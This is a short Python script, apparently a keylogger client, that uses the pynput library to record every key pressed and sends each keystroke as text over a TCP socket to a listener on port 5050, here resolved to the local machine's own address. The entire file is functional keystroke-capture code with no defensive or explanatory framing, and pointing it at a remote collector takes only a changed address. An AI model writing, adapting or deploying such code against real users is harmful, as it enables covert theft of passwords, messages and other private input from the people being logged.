import socket
from pynput import keyboard

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostbyname(socket.gethostname())
port = 5050
ADDR = (host, port)

client.connect(ADDR)

def on_press(key):
    try:
        write('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        write('special key {0} pressed'.format(key))

def write(message):
    client.send(message.encode('utf-8'))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
